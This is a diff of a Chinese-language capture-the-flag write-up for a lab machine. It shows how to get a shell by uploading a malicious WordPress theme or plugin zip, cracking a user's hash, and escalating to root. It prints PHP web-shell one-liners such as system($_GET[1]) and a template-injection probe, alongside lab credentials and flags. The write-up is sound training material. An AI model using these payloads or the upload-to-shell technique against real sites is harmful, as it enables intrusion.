@@ -2,6 +2,8 @@
 
 2025.02.26 https://thehackerslabs.com/thefirstavenger/
 
+[video](https://www.bilibili.com/video/BV1LCP7eGEFd/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)
+
 ## Ip
 
 192.168.5.39
@@ -22,23 +24,34 @@ web 首页无内容，扫描出 http://192.168.5.39/wp1/ 是个 wordpress，先�
 Username: admin, Password: spongebob
 ```
 
-登陆 wp 后台，在 Theme 编辑的地方上传一个 zip 文件包，里面包含 index.php 和 style.css 文件，其中 style.css 的文件内容要类似这样的格式：
+登陆 wp 后台，在 Theme 编辑的地方上传一个 zip 文件包，里面包含 index.php 和 style.css 文件，其中 style.css 的文件开始内容要类似这样的格式，同时创建的 zip 压缩包的名字与 Theme Name 一样：
 
 ```
 /*
-Theme Name: shah
-Theme URI:
-Author: shah
-Author URI: http://shah.gq
-Description: Wordpress Theme
-Version: 1.0
+Theme Name: demo
 */
+
+zip demo.zip index.php style.css
 ```
 
 然后 index.php 就是反弹 shell 的 php 脚本，在 Theme install 后，就可以访问这个页面得到反弹的 shell：
 
 ```
-curl http://thefirstavenger.thl/wp1/wp-content/themes/8888/index.php
+curl http://thefirstavenger.thl/wp1/wp-content/themes/demo/index.php
+```
+
+这里如果上传的是一个插件，需要将 php 反弹文件的名称改成 zip 的的名称，同时与下面的 Plugin Name 名字一样，两个名称要保持一致，并且在 php 的开始加入下面这样的注释模板,否则插件识别不了，安装时报错：
+
+```
+/*
+Plugin Name: test
+*/
+
+zip test.zip test.php
+```
+
+```
+curl http://thefirstavenger.thl/wp1/wp-content/plugins/test/test.php
 ```
 
 得到反弹后，先查看 wp 的数据库配置文件：
@@ -68,7 +81,7 @@ mysql> select * from avengers;
 +----+--------------+------------+----------------------------------+
 ```
 
-同时发现系统上有一个用户也叫 steve，尝试破解其哈希 723a44782520fcdfb57daa4eb2af4be5 得到明文密码: thecaptain
+同时发现系统上有一个用户也叫 steve ，尝试破解其哈希 723a44782520fcdfb57daa4eb2af4be5 得到明文密码: thecaptain
 
 su 切换到 steve ，拿到 user flag:
 
@@ -111,4 +124,28 @@ bash-5.2# ls
 root.txt
 bash-5.2# cat root.txt
 LAZWSPcMckPMzNPtRrVHsDLjw754tT77t9MVuvda
+```
+
+最后在看一下 server.py 的实现源码，为什么命令执行那里不能注入，使用了 flask：
+
+```
+if not ip_address:
+        return render_template_string(HTML_FORM)
+    try:
+        result = subprocess.check_output(['/usr/bin/ping', '-c', '1', ip_address], stderr=subprocess.STDOUT, text=True)
+    except subprocess.CalledProcessError as e:
+        result = f"Error al ejecutar: {e.output}"
+    except Exception as e:
+        result = f"Error inesperado: {str(e)}"
+    return render_template_string(HTML_FORM, result=result, ip_address=ip_address)
+```
+
+subprocess.check_output 后面接的是参数，会当成一个整体，所以不能用;号分割。<?php system('whoami');?>
+
+也可以用这个网站 https://cheatsheet.hackmanit.de/template-injection-table/ 按顺序输入各种 payload，然后根据返回结果，就可以进一步判断使用的是那种模板引擎。推荐测试：
+
+```
+{{1in[1]}}
+
+<?php system($_GET[1]); ?>
 ```
